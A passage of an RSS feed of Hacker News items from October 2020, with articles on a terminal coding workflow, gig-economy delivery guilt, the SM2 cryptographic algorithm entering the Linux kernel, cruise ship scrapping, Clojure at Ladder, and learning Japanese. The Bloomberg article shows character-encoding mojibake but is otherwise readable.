                                                  <p>Britton Ledingham for the Libin Cardiovascular Institute</p>
                              </div>
            </div>
          </div>
              </div>
          </div>
  </div>


                                                                                    </div>
                
                
              </div>
              
            </div>

          </div>
        </div></div>]]>
            </description>
            <link>https://libin.ucalgary.ca/news/research-team-discovers-breakthrough-potential-prevent-reverse-alzheimers</link>
            <guid isPermaLink="false">hacker-news-small-sites-24939160</guid>
            <pubDate>Fri, 30 Oct 2020 04:27:23 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[My Writing and Coding Workflow]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24939140">thread link</a>) | @thecedarprince
<br/>
October 29, 2020 | http://jacobzelko.com/workflow/ | <a href="https://web.archive.org/web/*/http://jacobzelko.com/workflow/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
          <p><em>My personal workflow for terminal-based coding, writing, research, and more!</em></p>

<p>Hello everyone!
It has been quite sometime since I last posted!
Suffice it to say, I have been immensely busy the past year but I am happy to say I am able to resurrect this blog! <img title=":tada:" alt=":tada:" src="https://github.githubassets.com/images/icons/emoji/unicode/1f389.png" height="20" width="20"></p>

<p>I have thoroughly grown into my own workflow for programming, research, and writing.
Today, I am happy to be able to share it with you!</p>

<p>If you prefer to watch a video describing most of this entire process, here is an overview of my workflow from one of my <a href="https://www.twitch.tv/thecedarprince">live streams</a>.
It does not go as in-depth as this document but should serve as a strong complement to this post. <img title=":smile:" alt=":smile:" src="https://github.githubassets.com/images/icons/emoji/unicode/1f604.png" height="20" width="20"></p>

<p>
<iframe width="560" height="315" src="https://www.youtube.com/embed/2SLZQQfMF8E" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" allowfullscreen=""></iframe>
</p>



<p>I use <a href="https://github.com/alacritty/alacritty">Alacritty</a> as my terminal, <a href="https://www.zsh.org/">zsh</a> and <a href="https://ohmyz.sh/">oh-my-zsh</a> as my shell and plugin manager respectively, <a href="https://github.com/tmux/tmux">tmux</a> as my multiplexer, <a href="https://github.com/Peltoche/lsd">lsd</a> as my list command with fun icons, <a href="https://github.com/belluzj/fantasque-sans">Fantasque Sans Mono</a> as my typeface font, <a href="https://github.com/neovim/neovim">neovim</a> for my editor, <a href="https://github.com/junegunn/fzf">fzf</a> paired with <a href="https://github.com/BurntSushi/ripgrep">ripgrep</a> for speedy and interactive file finding, <a href="https://github.com/sharkdp/bat">bat</a> an enhanced <code>cat</code> with a git diff gutter, <a href="https://github.com/jgm/pandoc">pandoc</a> for writing in markdown and LaTeX and outputting the piece to whatever file type I want, <a href="http://jacobzelko.com/setting-up-zotero/">Zotero</a> for managing my collection on scientific literature, <a href="https://github.com/ranger/ranger">ranger</a> as a terminal-based file explorer, and <a href="https://github.com/morhetz/gruvbox-contrib">gruvbox-dark</a> as my general color palette.</p>

<p>Here are gists to the relevant config files I use to modify my interface and user experience:</p>

<ul>
  <li>
<strong>neovim</strong>: <a href="https://gist.github.com/TheCedarPrince/7b9b51af4c146880f17c39407815b594">init.vim</a>
</li>
  <li>
<strong>Alacritty</strong>: <a href="https://gist.github.com/TheCedarPrince/7743091bd8743a7568b718f30bf707c2">.alacritty.yml</a>
</li>
  <li>
<strong>tmux</strong>: <a href="https://gist.github.com/TheCedarPrince/07f6f8f79b1451ec436ff8dee236ccdd">.tmux.conf</a>
</li>
  <li>
<strong>zsh</strong>: <a href="https://gist.github.com/TheCedarPrince/77afe2674803d965a0f5abd108337040">.zshrc</a>
</li>
</ul>

<p>Here is a picture of what that looks like altogether:</p>

<p><img src="http://jacobzelko.com/assets/workflow_layout.png" alt=""></p>

<h2 id="my-workflow-in-action">My Workflow in Action</h2>

<p>The following sections describe in broad strokes my workflow.
I mention some plugins that I use and are provided in my config files.
If you want to learn more about them, I encourage you to read through my config files or search for them.</p>

<h3 id="persistent-working-sessions-via-tmux">Persistent Working Sessions via tmux</h3>

<p><img src="http://jacobzelko.com/assets/tmux_restore.gif" alt=""></p>

<p>Though it is a little hard to see, I closed my terminal completely.
Oh no!
All my paneling and windows have disappeared! 
I’ll have to spend valuable time getting my workflow set back up… Or do I?</p>

<p>tmux can actually remember all these layouts with the plugins, <code>resurrect</code> and <code>continuum</code>. 
This is great for when your computer unexpectedly dies or crashes as everything is backed up at regular intervals you define!
Furthermore, pairing the (neo)vim plugin, <code>obsession</code>, allows tmux to also automatically recover vim layouts and sessions as well.
You will never have to worry about losing your terminal workflow again!</p>

<h3 id="vim-slime-for-rapid-evaluation">Vim-Slime for Rapid Evaluation</h3>

<p><img src="http://jacobzelko.com/assets/vim_slime.gif" alt=""></p>

<p>Here, I target my Julia REPL in a tmux panel and use the <code>vim-slime</code> plugin to send code from my Julia script opened in neovim to the Julia REPL for rapid evaluation. 
This config works for any time you want to target a window.
This also works for code chunks such as functions or loops!</p>

<h3 id="mouse-mode">Mouse Mode</h3>

<p><img src="http://jacobzelko.com/assets/mouse_mode.gif" alt=""></p>

<p>tmux and (neo)vim also support mouse mode and interactivity!
I can quickly jump all over the place with my mouse or easily resize any opened pane.</p>

<h3 id="interactive-file-finding">Interactive File Finding</h3>

<p><img src="http://jacobzelko.com/assets/vim_fzf.gif" alt=""></p>

<p>I integrated the powerful file finding tool, <code>fzf</code>, with <code>ripgrep</code> to quickly find files I am looking to use. 
Then, in my (neo)vim configuration file, I merged these two together into one function that I can easily call while editing files in (neo)vim. 
find files I search for and pandoc to enable citations in pandoc, markdown, or TeX files.</p>

<h3 id="terminal-based-file-explorer">Terminal-Based File Explorer</h3>

<p><img src="http://jacobzelko.com/assets/ranger_mode.gif" alt=""></p>

<p>Furthermore, I also use the great tool, <code>ranger</code>, which allows me to have a terminal based file explorer.
It’s nice as it pops up in its own window and does not actually directly interfere with any of the background files being edited. 
It even has image preview capabilities!</p>

<h3 id="citation-engine--live-preview">Citation Engine &amp; Live Preview</h3>

<p><img src="http://jacobzelko.com/assets/citation_mode.gif" alt=""></p>

<p>As a researcher, this part gets me immensely excited!
While I am writing, I can actively insert citation keys into whatever I am working on via <code>vim-pandoc</code>.
With my config file, you will have to specify where your own .bib file exists.
Furthermore, <code>markdown-preview</code> allows me to preview my markdown in a web browser and <code>vim-latex-live-preview</code> allows me to view my current TeX files in a pdf viewer – works for subfiles too! 
This works for whenever I write TeX files or markdown files which makes writing a breeze!</p>

<p>If any of this section is confusing, I strongly encourage you to read my article on <a href="http://jacobzelko.com/personal-research-management/">Knowledge Management</a>.</p>

<h2 id="conclusion">Conclusion</h2>

<p>I hope you found my workflow and toolchain interesting!
My dream would be for this workflow to serve as inspiration for your own workflow.
Make it your own and all the best!</p>

<p><em>If you spot any errors or have any questions, feel free to <a href="http://jacobzelko.com/contact/">contact me</a> about them!</em></p>

<hr>

        </div></div>]]>
            </description>
            <link>http://jacobzelko.com/workflow/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24939140</guid>
            <pubDate>Fri, 30 Oct 2020 04:22:52 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Every brown take-out bag]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24938760">thread link</a>) | @secondbreakfast
<br/>
October 29, 2020 | https://secondbreakfast.co/inside-every-brown-take-out-bag… | <a href="https://web.archive.org/web/*/https://secondbreakfast.co/inside-every-brown-take-out-bag…">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>

<blockquote>
<p><span>“</span>I wanted Uber Eats because it was raining. But didn’t end up ordering because it was raining.” - Recent text from a friend</p>
</blockquote>
<p>Paying for somebody to deliver burgers and fries usually feels fine. <em>They could decline the gig if the price isn’t fair.</em></p>
<p>But when you’re sitting on a bench across from a mid-forties man <a href="https://secondbreakfast.co/union-square">rubbing his knee and popping Advil</a>, or when a woman is standing outside the door, dripping wet, brown bag in hands, glancing at the gray Scandinavian couch and 65″ Sony on the wall, guilt creeps in.</p>
<p>Maybe Doordash and Instacart aren’t stealing the tips. Maybe they are. I don’t know. But I do know something feels weird about paying somebody to mask up and pluck items off the shelf while I sit on the couch. For only $8!</p>
<p>I’d order more often if I didn’t feel guilty.</p>
<p>But the gig economy is stuck in a prisoner’s dilemma. Doordash can’t raise prices to pay Dashers™ more. If they did, everyone would use Postmates or Uber or Amazon instead.</p>
<p>Game theory means it’s cutthroat prices and cutthroat wages. Game theory means inside every bag of hot food left on the doorstep, there’s a little feeling of shame. <em>They could decline the gig if the price isn’t fair.</em></p>
<p>When price for delivery goes up, people order less often. Same in the other direction. But I wonder if the gig economy prisoner’s dilemma is suppressing overall demand for food and grocery delivery.</p>
<p>If seeing Palm Oil on an ingredients list didn’t make customers think about deforestation and global warming, then more products would have palm oil.</p>
<p>The same goes for delivery and labor practices.</p>
</div></div>]]>
            </description>
            <link>https://secondbreakfast.co/inside-every-brown-take-out-bag…</link>
            <guid isPermaLink="false">hacker-news-small-sites-24938760</guid>
            <pubDate>Fri, 30 Oct 2020 03:14:37 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[SM2 (Chinese) National Secret algorithm is accepted into Linux kernel]]>
            </title>
            <description>
<![CDATA[
Score 8 | Comments 2 (<a href="https://news.ycombinator.com/item?id=24938686">thread link</a>) | @hyiltiz
<br/>
October 29, 2020 | https://www.codetd.com/en/article/12031985 | <a href="https://web.archive.org/web/*/https://www.codetd.com/en/article/12031985">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
                        
                        <p><span>
                            <a href="https://www.codetd.com/en/cat/17746/1">News</a>
                        </span>
                            <span>2020-10-27 14:44:54</span>
                            <span>views: null</span>
                        </p>

                    </div><div><div> 
  
 <p><span><span>On October 25, a developer posted that the SM2 national secret algorithm was finally accepted by the Linux kernel community. </span><span>The author stated that the SM2 patch has been updated to version v7. This version of the patch was finally accepted by the community. It has been </span></span><a href="https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/log/?qt=author&amp;q=Tianjia+Zhang"><span><span>merged into the 5.10-rc1 of the Linux mainline</span></span></a><span><span> . If nothing </span><a href="https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/log/?qt=author&amp;q=Tianjia+Zhang"><span>else</span></a><span> , it will be officially released in the 5.10 kernel version.</span></span></p> 
 <p><span><span>National Secret is the abbreviation of National Commercial Encryption. The National Encryption Administration Bureau formulates algorithm standards, and it also formulates a large number of product and interface specifications and application scenarios. </span><span>Since 2012, the State Cryptography Administration has successively published SM2/SM3/SM4 and other cryptographic algorithm standards and their application specifications in the form of the "People's Republic of China Password Industry Standards". </span><span>Among them, "SM" stands for "commercial secret", which is a cryptographic technology used for commercial use that does not involve state secrets.</span></span></p> 
 <p><span><span>According to the author, the current Linux kernel has well supported the SM3 and SM4 algorithms, thanks to the widespread use of wireless LAN standards. </span><span>However, the SM2 algorithm and the national secret certificate have not been supported for a long time, and it is impossible to establish full-stack trust and integrity verification in the kernel based on the national secret. Therefore, it has become urgent to support this system in the kernel.</span></span></p> 
 <p><span><span>It took 7 rounds for the kernel community to accept SM2. </span><span>The initial consideration was to migrate from openssl, but the openssl architecture and infrastructure code needed to be ported because of the huge workload. </span><span>After several rounds of discussion and testing, I found that the existing libgcrypt already has a complete elliptic curve basic algorithm, so I tried to implement SM2 in libgcrypt first, and finally the SM2 algorithm was accepted by the community as a sub-algorithm of ECC. </span><span>After that, SM2 was gradually accepted by the kernel community.</span></span></p> 
 <p><span><span>At present, libgcrypt has fully supported the national secret algorithm SM2/3/4, and these implementations will be officially released in the next version 1.9.0. </span><span>At the same time, as a user-mode tool for IMA integrity signatures, ima-evm-utils' support for national secrets has not fallen. </span><span>Click to view </span></span><a href="https://sourceforge.net/p/linux-ima/ima-evm-utils/ci/ceecb28d3b5267c7d32c6e9401923c94f5786cfb/log/?path="><span><span>related submissions</span></span></a><span><span> .</span></span></p> 
 <p><span><span>Finally, the author also summarizes the known issues of SM2:</span></span></p> 
 <ul> 
  <li><span><span>To support national secret certificate verification, SM2 either does not compile, or it must be built-in compilation, and does not support compilation into modules. </span><span>Of course, SM2, as an asymmetric algorithm, only signs a hash or IMA verification based on national secrets, and there is no such limitation.</span></span></li> 
  <li><span><span>The IMA signature tool ima-evm-utils and the national secret algorithm used by the kernel to calculate the SM3 hash of the file do not add Za. This is a little difference from the specification.</span></span></li> 
 </ul> 
 <p><a href="https://linux.cn/article-12751-1.html"><span><span>Reference reading</span></span></a></p> 
</div></div></div>]]>
            </description>
            <link>https://www.codetd.com/en/article/12031985</link>
            <guid isPermaLink="false">hacker-news-small-sites-24938686</guid>
            <pubDate>Fri, 30 Oct 2020 03:01:04 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[The Messy, Booming Business of Recycling Cruise Ships]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24938508">thread link</a>) | @finphil
<br/>
October 29, 2020 | https://www.bnnbloomberg.ca/the-messy-booming-business-of-recycling-cruise-ships-1.1514614 | <a href="https://web.archive.org/web/*/https://www.bnnbloomberg.ca/the-messy-booming-business-of-recycling-cruise-ships-1.1514614">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>(Bloomberg) -- Carnival Fantasy was a ship famous for its outlandish dÃ©cor, all-night revelry and its sizeâ€”back when 2,000 was an incredible number of passengers. The â€œFun Shipâ€� vibe it introduced in 1990 came with such whimsical spaces as an Egyptian-themed piano bar, decorated with a fake sarcophagus, and a glitzy glass-topped atrium that was the hub of the social scene.</p><p>Today the Fantasy is attracting a whole different breed of booty-seeker. In July, the 30-year-old ship sailed to the Aegean Sea, wrapping its final voyageÂ&nbsp;in the shipbreaking capital of Aliaga, Turkey.</p><p>Its resting place there isÂ&nbsp;aÂ&nbsp;demolition yard where old cargo ships, tankers, research vesselsâ€”and now cruise ships retired during the Covid-19 pandemicâ€”get torn apart and broken into pieces. In this case, theyâ€™re not being broken in half to  get upgraded and stitched back together. Instead,Â&nbsp;circling the Fantasyâ€™s partially deconstructed innards are buyers from all sorts of industries, looking for rock bottom deals on everything from artwork and kitchenwares to electrical wires and stainless-steel sinks.</p><p>For the cruise company, itâ€™s an opportunity to recoup at least some value from an asset thatâ€™s currently acting as dead weight; while shipsâ€™ values  declineÂ&nbsp;with age, the Fantasy was originally built for about $225 million. And for the recycling companies that buy the vesselÂ&nbsp;for cash and take on the hazardous task of emptying all its valuables, itâ€™s a matter of a months-long salvage resale on steroids.</p><p>Cutting the Losses</p><p>Itâ€™s hard to gauge how exactly much money is made off of cruise ship recycling. Companies donâ€™t immediately disclose the sale prices of the vessels after relinquishing ownership, and the resale value of their most sought-after commodity, scrap steel, fluctuates in each global market on a daily basis.Â&nbsp;</p><p>But the business is booming.</p><p>Next to Carnival Fantasy in Aliaga are two otherÂ&nbsp;Fantasy-class ships built in the late 1990s. And next to them are two former Royal Caribbean vessels (scrapped by Royalâ€™s Spanish partner line Pullmantur Cruceros). The ships all had big fan bases, even as they aged. Fantasy and its sister ships started 2020 full of passengers bent on fun-in-the-sun activities in the Caribbean, Bahamas, and Mexican Riviera.</p><p>The ships would have left the fleet in coming years even in a healthy industry; the pandemic sped up the process, with owners of idled vesselsÂ&nbsp;hemorrhaging cashÂ&nbsp;and looking to cut their losses.</p><p>In its third quarter filing, Carnival Corporation said it planned to sell 18 â€œless efficientâ€� ships in 2020, resulting in a 12% reduction of its nine-brand fleet. â€œThose ships were giving us a bad drain,â€� Carnival CEO Arnold Donald said during a recent webinar with the Society of American Travel Writers.</p><p>Going, Going, Gone</p><p>Without much of a market for second-hand tonnage, the main worth of the ships is the steel that makes up the superstructure.</p><p>If, for instance, Carnival Fantasy has 15,000 tons of steel in its superstructure, the scrap may sell for upwards of $4.7 million based on current global market pricesâ€”though other factors also come into play, such as local prices and demand.</p><p>Along with the risk of these market fluctuations, the buyer also takes on the uncertainty of just how much metal can be salvaged. Pre-1990s ships tend to have more steel in their hulls and underwater plating, but those built in the â€™90s and after can bear lighter and stronger alloys.</p><p>Either way, steel and metal scraps will travel to a smelter to make rebar for construction projects around the world. Steel from some other dismantled ships can find its way to Turkeyâ€™s  large car manufacturing industry, where it might become parts for a Toyota orÂ&nbsp;a Ford.</p><p>Aluminum, copper, and stainless steel are also salvaged and resold, along with other valuable commodities that mostly remain in Turkey. The ripped out teak decks on Fantasy may end up in local shops, restaurants, and homes. Theater scenery and lighting may find its way into show productions. Even the tackiest artwork has some value, and can end up in restaurants throughout the country.</p><p>Buyers come to the yard for everything down to the bolts and nuts. Even if a used toilet sells for a fraction of the shelf price, multiply that amount by a few thousandâ€”given the number of cabins and public spaces on each shipâ€”and it can add up to a substantial sum.</p><p>According to Orbay Simsek, vice president of the Aliaga-based Simsekler Ship Recycling Company, there are even markets for kitchenware, closets, and blankets.Â&nbsp;</p><p>Basically anything and everything that can be sold, sells. Everything must go. Even the sarcophagus.</p><p>Eco-friendly Shipbreaking</p><p>Taking apart ships is a controversial topic, thanks to concerns over both human and environmental risks. Itâ€™s one of the most dangerous jobs in the world, according to Wouter Rozenveld, director of Sea2Cradle (SC2), an expert in green ship recycling who was hired by Carnival to oversee the safe dismantling of its ships. Each Carnival vessel may take up to nine months to break down, he says, and the blowtorch-based work comes with constant fire hazards.</p><p>Those hazards are amplified when the recyclable component pieces, like furniture, cabling, piping, and machinery inside each deck have to be carefully taken apart and separated says Ehud Bar-Lev, who overseesÂ&nbsp;assessment services at maritime specialist Lloydâ€™s Register.</p><p>The extra steps in disassembly also increase potential for hazardous waste spills, containing everything from oily residues to sludge, asbestos, and coolants in fridges.</p><p>To prevent those incidents, the Turkish shipbreaking yard undertakes its work in a concrete holding area that catches debris; in similar facilities throughout India and Bangladesh, the process may happen on the beach. Rather thanÂ&nbsp;letting toxic chemicals spew into the water, the Turkish yard collects the materials, has them cataloged by Sea2Cradle, and then hands them over toÂ&nbsp;the government-runÂ&nbsp;Ship Recycling Association of Turkey for proper disposal.</p><p>Carnival Corporation saw these precautions as a marketingÂ&nbsp;opportunity, making aÂ&nbsp;highly unusual move to publicize its efforts as â€œresponsible recycling.â€� But it was the shipbreaking yard, not Carnival, that saw the biggest windfall as a result:Â&nbsp;never before hasÂ&nbsp;AliagaÂ&nbsp;seen five mega cruise ships in its harbor.</p><p>There may be more coming in the months ahead.</p><p>â€œThe longer the pandemic rages on in the world, the more cruise ships will end up in scrapyards, and my guess is at an increasingly younger age,â€� says ManWo Ng, a maritime management professor at Virginiaâ€™s Old Dominion University. â€œEven if a vaccine becomes available, how many of us will be comfortable jumping right back on cruise ships?â€�</p><p>Â©2020 Bloomberg L.P.</p></div></div>]]>
            </description>
            <link>https://www.bnnbloomberg.ca/the-messy-booming-business-of-recycling-cruise-ships-1.1514614</link>
            <guid isPermaLink="false">hacker-news-small-sites-24938508</guid>
            <pubDate>Fri, 30 Oct 2020 02:28:54 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Why Clojure?]]>
            </title>
            <description>
<![CDATA[
Score 7 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24938484">thread link</a>) | @simonpure
<br/>
October 29, 2020 | https://jeffchen.dev/posts/Why-Clojure/ | <a href="https://web.archive.org/web/*/https://jeffchen.dev/posts/Why-Clojure/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>One piece of unattributed wisdom that's stuck with me is "don't take more than one technology bet". At Ladder, our big bet is using <a href="https://clojure.org/" target="_blank" rel="nofollow noopener noreferrer">Clojure</a> for fullstack app development. Ladder's used Clojure since day 1 in 2015, and we wouldn't want it any different! In particular, Clojure's Lisp heritage, focus on pure functions and immutable data structures, unified client-server support, and superior developer experience have helped us write higher quality code faster.</p>
<!-- excerpt -->
<h2>Pure functions and immutability</h2>
<p>One of the challenges with ordinary, imperative programming languages like Javascript or Python is the increasing complexity of state management. As your application grows, it becomes harder and harder to isolate where in the codebase specific changes to your application state occur. This is because with typical application architectures in those languages, any function can perform <a href="https://en.wikipedia.org/wiki/Side_effect_%28computer_science%29" target="_blank" rel="nofollow noopener noreferrer">side effects</a> or modify incoming or global state. On the other hand, Clojure strongly emphasizes working with <a href="https://en.wikipedia.org/wiki/Pure_function" target="_blank" rel="nofollow noopener noreferrer">pure functions</a> (well, if you discount I/O...) and <a href="https://clojure.org/about/state" target="_blank" rel="nofollow noopener noreferrer">immutable data structures</a>. A Clojure programmer must be explicit when defining and modifying mutable state - this helps minimize its usage and makes it easier to reason about.</p>
<p>Immutable data structures and pure functions also lend themselves well to concurrent programming. We rarely find ourselves worrying about locks and shared data in a multi-threaded environment, because our functions are rarely modifying shared state. And when we do, Clojure provides <code>atom</code>, a thread-safe wrapper around ordinary data structures. Behind the scenes, setting an <code>atom</code>'s value calls <code>compare-and-set!</code>. That means no fussing around with locks or mutexes and no worrying about your data changing before you modify it. With this one simple construct, Clojure removes 99% of our concurrency headaches.</p>
<h2>Clojure is a Lisp</h2>
<p>There are probably enough Lisp arguments on the Internet already - I'll defer to <a href="https://clojure.org/about/rationale#_lisp_is_a_good_thing" target="_blank" rel="nofollow noopener noreferrer">Rich Hickey</a> (Clojure's creator) and <a href="http://www.paulgraham.com/avg.html" target="_blank" rel="nofollow noopener noreferrer">Paul Graham</a> instead of adding another rehash. That said, Clojure provides some advantages over other Lisps like Common Lisp and Scheme:</p>
<ul>
<li>CL only includes lists in its core language spec. Clojure introduces vectors, sets, and maps which makes reading and writing code so much less tedious. Of course Scheme has all of these except sets.</li>
<li>Clojure's core data structures are immutable which, as discussed above, makes reasoning about code, especially concurrent code, much easier.</li>
</ul>
<h2>Clojure runs everywhere</h2>
<p>Clojure provides first class support for sharing code between platforms with <a href="https://clojure.org/guides/reader_conditionals" target="_blank" rel="nofollow noopener noreferrer">reader conditionals</a>. Most of our namespaces at Ladder take advantage of this and are shared across our client (Clojurescript) and server (Clojure). In fact, all of our client React code (aside from browser-specific API calls like clipboard, input handlers, etc) supports being run on the JVM. This lets us run what we call "full-stack tests" entirely within a Java process. For example, we can run full user flows like "user can accept a life insurance policy" and assert against both client and server state <strong>in the same test</strong>. The closest analogue without this superpower would be running a Selenium test against a running webserver, which introduces all sorts of potential flakiness. For more on full-stack tests, check out <a href="https://www.youtube.com/watch?v=qijWBPYkRAQ&amp;t=346s" target="_blank" rel="nofollow noopener noreferrer">this talk</a> two of our engineers gave at Clojure West in 2017.</p>
<p>Clojure also provides easy <a href="https://clojure.org/guides/reader_conditionals#_host_interop" target="_blank" rel="nofollow noopener noreferrer">host interop</a> for each supported platform. This lets us leverage the full JVM (and Javascript) ecosystem. For example, we use popular Java libraries like <a href="https://www.eclipse.org/jetty/" target="_blank" rel="nofollow noopener noreferrer">Jetty</a>, <a href="https://mvnrepository.com/artifact/org.apache.kafka/kafka-clients" target="_blank" rel="nofollow noopener noreferrer">kafka-clients</a>, <a href="https://github.com/google/tink" target="_blank" rel="nofollow noopener noreferrer">Tink</a>, and more. On the frontend, we use React, and can easily include other Javascript libraries for analytics, error handling, and session replays.</p>
<h2>Developer experience</h2>
<p>When I’ve worked with Typescript and Python in the past, I was constantly waiting for my development server to reload. Clojure makes updating code on your local server as simple as reloading the updated namespace in your REPL. If you want, you can even <a href="https://github.com/nrepl/nrepl" target="_blank" rel="nofollow noopener noreferrer">update remote, (hopefully) non-production webservers</a>! Being able to evaluate code in a REPL and have your running web server update in less than a second makes exploration and iteration on your actual backend so much faster. Instant feedback makes developers more playful and experimental. Ultimately, it helps them write better code faster.</p>
<p>It’s also super easy to run small chunks of code in the REPL. Ladder, like other Clojure shops, has a convention of documenting namespace usage with a <code>comment</code> block at the bottom. Developers can use the code within to learn the namespace’s API, run commonly used procedures, or test changes to the rest of the namespace - all without leaving their editor!</p>
<h2>Why not Clojure?</h2>
<p>While we're extremely satisfied with our choice of Clojure, we've had our fair share of headaches. First, Clojure processes take a long time to start up - especially as the size of the application grows. Our webserver at Ladder takes a full minute before it can accept web requests. This makes autoscaling in response to load more challenging - some of our load can spike in well under a minute, so we have to be consistently overprovisioned to handle it. Second, Clojure produces pretty big artifacts. This matters less on the backend, where our webserver JAR is over 1.5GB, but hurts us on the frontend. We still have work to do here, but our initial bundle is 7.2MB uncompressed (1.0MB gzipped)! If raw performance or bundle size is your primary concern, you might be better off choosing another language.</p>
<h2>Conclusion</h2>
<p>As a small company, we have more ideas to try than we have bandwidth to implement. Using Clojure has helped our team be more iterative and more productive, so we can ship more experiments and projects than we would otherwise be able to. I feel super lucky that Ladder introduced me to Clojure - and I'm excited to see how Clojure and our use of it continues to evolve!</p>
</div></div>]]>
            </description>
            <link>https://jeffchen.dev/posts/Why-Clojure/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24938484</guid>
            <pubDate>Fri, 30 Oct 2020 02:23:20 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Path for Mastering Japanese]]>
            </title>
            <description>
<![CDATA[
Score 5 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24938456">thread link</a>) | @sova
<br/>
October 29, 2020 | https://japanesecomplete.com/path/ | <a href="https://web.archive.org/web/*/https://japanesecomplete.com/path/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page">    
    <!-- Hero section -->
    <section id="hero">
      <!-- Navigation -->
      <nav id="tmNav">              
        
      </nav>
      
      <div>
        <div>
            <h2>Mastering Japanese</h2>
            <p>
              Getting to Native-Level Japanese
              <br>A Straightforward <strong>Path to Mastery</strong>

              <br>by <span>Hake Hayashi</span><br>
              <span>27 October 2020</span>
            </p>
        </div>        
      </div>

            
    </section>

    <section id="introduction">
      <div>
        <div>
          <p><img src="https://japanesecomplete.com/img/castle-sunset.jpg" alt="Japanese Castle at Sunset">
          </p>
          <div>
            <div>
                <h2>The Syllabaries</h2>
                <div><p>
                  The Japanese language, called 日本語（にほんご）[knee-hohn-go] is composed of 2 major syllabaries, <strong>Hiragana and Katakana.</strong> Made up of <strong>Consonant-Vowel pairs</strong> [ka, ga, ta, su, mu] as opposed to single letters that can be combined in variety, Hiragana and Katakana are two versions of the same collection, Katakana being used for <strong>foreign loan words</strong> since the reorganization of public education in 1962.</p><p>
                  In addition to Hiragana (the native script) and Katakana (reserved for foreign loan-words post-62), Japan imported symbolic glyphs from mainland Asia and they are referred to as 漢字（かんじ） kanji — letters of the Han Dynasty.
              </p></div>
                <p>
                  You can learn the Hiragana in the inside front cover of our <a href="https://japanesecomplete.com/guide">guide</a> that contains information on essential grammar, sentence structure, sound-effect language, and covers some of the more nuanced aspects of the language in plain English.</p>
                  
            </div>
          </div>
        </div>

        <div>
          <div>
            <h4>Hiragana ひらがな</h4>
            <p>Warm and curvy, the ひらがな [hiragana] are used for native Japanese words and are the primary phonetic syllabary of Japanese.
            </p>
            <p>あ　い　う　え　お</p>
            <p>か　き　く　け　こ</p>
            <p>さ　し　す　せ　そ</p>
            <p>た　ち　つ　て　と</p>
            <p>ま　み　む　め　も</p>
            <p><a href="https://japanesecomplete.com/guide">Full Hiragana Chart in our Guide…</a></p>
          </div>
        
        <div>
          <h4>Katakana カタカナ</h4>
          <p>
            The カタカナ [katakana] are sharp and angular, and while letters to friends have been written entirely in Katakana (and Kanji), <a href="https://upload.wikimedia.org/wikipedia/commons/3/3f/Masabumi_Hosono_titanic_diary.jpg">such as this beautiful letter recovered from the Titanic,</a> since 1962 the カタカナ [katakana] have been reserved for foreign loan-words such as "computer" コンピュータ [konpyuuta] and "glass" ガラス [garasu].  <br>カタカナ [katakana] have a one-to-one correlation with the ひらがな [hiragana] similar to how English has print and cursive.
          </p>
        </div>
        <div>
          <h4>Kanji 漢字（かんじ）</h4>
          <p>
           The 漢字（かんじ） [kanji] were imported lock, stock, and barrel from mainland Asia starting in the 5th century.  Fewer than 4% of them are pictographs, and over 90% of the kanji are "meaning and sound borrowers."  You can read more about the <a href="https://learnjapanesebest.wordpress.com/2019/12/11/the-four-types-of-kanji/">four types of kanji here.</a>
          </p>
        </div>
      </div>
    </div></section> <!--end part1-->

      <section id="part2">
      <div>
        <div>
          <div>
            <div>
                <h2>Practice Listening + Identifying</h2>
                <p>
                  「聞き取れない」（ききとれない）[kiki-torenai] is the Japanese expression for "unable to get a clear ear grab" of a sound or a term when listening.  The audible morphemes of Japanese require plenty of exposure to be able to distinguish them easily, due in part to the clunkiness of the syllabaries, the ひらがな Hiragana and カタカナ Katakana.  
              </p>
              <p>
                Japanese Complete provides a <a href="https://japanesecomplete.com/path/japanesecomplete.com/hiragana">ひらがな Hiragana listening challenge</a> for free to all; our カタカナ Katakana listening challenge is available to <a href="https://japanesecomplete.com/purchase">premium subscribers</a>
              </p>
                <p>
                  The site <a href="https://supernative.tv/">SuperNative.tv</a> has an incredible cornucopia of film and television show clips that one can watch on replay with subtitles and fill-in-the-blank exercises to practice the ability to "ear catch" or "ear grab" the audible morphemes of Japanese.  We highly recommend this resource for new learners to get an "ear grip" of the common Japanese sounds and how they are actually pronounced.  Naturally, real-life speech and the way it is written down may not appear to match up perfectly until one has plenty of exposure.</p>
                  
            </div>
          </div>
          <p><img src="https://japanesecomplete.com/img/sakura-close.jpg" alt="Image">
          </p>
        </div>
    </div></section> <!--end part 2-->

  <section id="part3">
      <div>
        <div>
          <p><img src="https://japanesecomplete.com/img/shinkansen-night.jpg" alt="Image">
          </p>
          <div>
            <div>
                <h2>Grammar: Particles</h2>
                <p>
